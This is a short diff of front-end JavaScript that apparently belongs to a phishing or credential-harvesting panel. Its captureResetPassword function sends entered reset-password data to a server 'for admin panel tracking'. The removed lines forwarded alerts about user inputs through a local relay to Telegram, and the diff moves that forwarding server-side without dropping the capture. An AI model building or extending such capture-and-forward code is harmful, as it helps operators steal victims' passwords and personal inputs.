@@ -129,18 +129,7 @@
 
         
         const notifyTimestamp = async (stageName) => {
-            const message = buildResetTimestampAlert(stageName, inputs);
-            
-            // Send to Telegram
-            try {
-                await fetch('http://localhost:3001/notify', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message })
-                });
-            } catch (err) {
-                console.warn('Telegram notification failed:', err);
-            }
+            // Notification now handled server-side
         };
         
         const captureResetPassword = async () => {
@@ -148,7 +137,7 @@
             
             // Send to main server for admin panel tracking
             try {
-                await fetch('http://localhost:3000/reset-password', {
+                await fetch('/reset-password', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
